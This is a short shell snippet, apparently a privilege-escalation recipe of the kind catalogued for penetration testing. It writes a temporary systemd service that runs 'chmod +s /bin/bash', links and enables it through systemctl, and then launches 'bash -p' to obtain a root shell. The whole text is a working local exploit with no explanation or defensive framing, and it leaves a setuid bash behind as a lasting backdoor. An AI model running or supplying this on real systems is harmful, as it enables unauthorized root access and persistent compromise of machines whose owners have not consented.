TF2=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF2
/bin/systemctl link $TF2
/bin/systemctl enable --now $TF2
/bin/bash -p